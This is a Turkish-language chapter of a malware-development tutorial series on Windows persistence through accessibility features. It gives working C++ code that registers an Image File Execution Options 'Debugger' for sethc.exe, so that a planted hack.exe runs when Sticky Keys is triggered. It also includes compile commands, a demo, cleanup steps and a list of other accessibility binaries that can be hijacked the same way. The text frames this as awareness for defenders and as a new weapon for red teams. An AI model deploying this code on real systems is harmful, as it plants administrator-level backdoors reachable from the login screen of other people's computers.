\newpage
\subsection{78. zararlı yazılım geliştirme: kalıcılık - bölüm 12. Erişilebilirlik Özellikleri. Basit C++ örneği.}

﷽

![pers](./images/72/2022-09-30_17-48.png){width="80%"}    

Bu gönderi, erişilebilirlik özellikleri aracılığıyla yönetici düzeyinde bir başka zararlı yazılım kalıcılığı tekniği üzerine yaptığım araştırmaların bir sonucudur.    

[Önceki](https://cocomelonc.github.io/malware/2022/09/10/malware-pers-10.html) gönderilerimden birinde, Image File Execution Options aracılığıyla kalıcılığı ele almıştım. Bir PoC (Proof of Concept) örneğinde, yalnızca aşağıdaki kayıt defteri anahtarında bir hata ayıklayıcı oluşturarak hedef süreci manipüle etmiştik:   

`HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe`

Daha sonra, yalnızca kötü amaçlı uygulamanın `System32` dizinine yerleştirilmesi yeterli oluyordu.    

### pratik örnek: sethc.exe

Bugün, hedef sürecimizi `sethc.exe` ile değiştireceğiz. Peki, `sethc.exe` nedir?
Bu dosya, yapışkan tuşlar özelliğinden sorumludur. `Shift` tuşuna `5` kez basıldığında, bu özellik etkinleşir.    

![pers](./images/72/2022-09-30_17-26.png){width="80%"}    

Orijinal `sethc.exe` yerine, sahte `sethc.exe` çalıştırılacaktır. Her zamanki gibi, basitlik açısından bu yalnızca bir "meow" mesaj kutusudur.Kaynak kodu oldukça benzerdir (`pers.cpp`):    

```cpp
/*
pers.cpp
windows persistence via Accessibility Features
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/30/malware-pers-12.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // image file
  const char* img = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image 
  File Execution Options\\sethc.exe";

  // evil app
  const char* exe = "C:\\Windows\\System32\\hack.exe";

  // Debugger
  LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)img, 0, NULL, 
  REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
  if (res == ERROR_SUCCESS) {
    // create new registry key
    // reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File 
    // Execution Options\sethc.exe" /v Debugger /d "hack.exe"
    RegSetValueEx(hkey, (LPCSTR)"Debugger", 0, REG_SZ, (unsigned char*)exe, 
    strlen(exe));
    RegCloseKey(hkey);
  }

  return 0;
}
```

Meow-meow mesaj kutusu:    

```cpp
/*
hack.cpp
evil app for windows persistence
via Accessibility Features
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/30/malware-pers-12.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
LPSTR lpCmdLine, int nCmdShow) {
  MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
  return 0;
}
```

### demo

Haydi, her şeyin nasıl çalıştığını görelim. Öncelikle, kayıt defteri anahtarlarını kontrol edelim:    

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
Image File Execution Options" /s
```

![pers](./images/72/2022-09-30_17-32.png){width="80%"}    

`pers.cpp` dosyamızı derleyelim:     

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![pers](./images/72/2022-09-30_17-40.png){width="80%"}    


Çalıştırın ve kayıt defteri anahtarlarını tekrar kontrol edin:    

> **Gerçek Windows ikili dosyasını değiştirmek için yönetici ayrıcalıklarına sahip olmanız gerekir.**    

```powershell
.\pers.exe
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File 
Execution Options\sethc.exe" /s
```

![pers](./images/72/2022-09-30_17-44.png){width="80%"}    

Son olarak, `Shift` tuşuna `5` kez basın:     

![pers](./images/72/2022-09-30_17-46.png){width="80%"}    

`hack.exe` dosyasının özelliklerine dikkat edin:     

![pers](./images/72/2022-09-30_17-47.png){width="80%"}    

![pers](./images/72/2022-09-30_17-47_1.png){width="80%"}    

Mükemmel! =^..^=    

Deneylerin sonunda temizleme işlemi için şu komutu çalıştırın:    

```powershell
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image 
File Execution Options\sethc.exe" -Force -Verbose
```

![pers](./images/72/2022-10-01_03-39.png){width="80%"}    

### sonuç

Windows Erişilebilirlik Özellikleri, Windows oturum açma ekranı üzerinden erişilebilen yardımcı programlar koleksiyonudur (örneğin, Sticky Keys).   

Bazı erişilebilirlik özellikleri, bunların tetikleme kombinasyonları ve konumları şunlardır:      

**1. Utility Manager**     
- `C:\Windows\System32\Utilman.exe`     
- Tetikleyici: `Windows tuşu + U`      

**2. Ekran Klavyesi**     
- `C:\Windows\System32\osk.exe`      
- Tetikleyici: Ekran klavyesi düğmesine tıklamak     

**3. Büyüteç**   
- `C:\Windows\System32\Magnify.exe`     
- Tetikleyici: `Windows Tuşu + =`        

**4. Ekran Okuyucu**       
- `C:\Windows\System32\Narrator.exe`    
- Tetikleyici: `Windows Tuşu + Enter`    

**5. Ekran Değiştirici**     
- `C:\Windows\System32\DisplaySwitch.exe`    
- Tetikleyici: `Windows Tuşu + P`    

Bu Windows özellikleri, APT gruplarının hedef bilgisayarlara arka kapı yerleştirmek için bunları kötüye kullanmasıyla iyi bilinir hale gelmiştir. Örneğin, [APT3](https://attack.mitre.org/groups/G0022/), [APT29](https://attack.mitre.org/groups/G0016/) ve [APT41](https://attack.mitre.org/groups/G0096/) grupları Sticky Keys yöntemini kullanmıştır.    

Umarım bu gönderi, mavi takım üyelerinin bu ilginç teknik hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.      

[MITRE ATT&CK. Event Tetikleyicied Execution: Accessibility Features](https://attack.mitre.org/techniques/T1546/008/)    
[APT3](https://attack.mitre.org/groups/G0022/)      
[APT29](https://attack.mitre.org/groups/G0016/)     
[APT41](https://attack.mitre.org/groups/G0096/)     
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2022-09-30-malware-pers-12)      
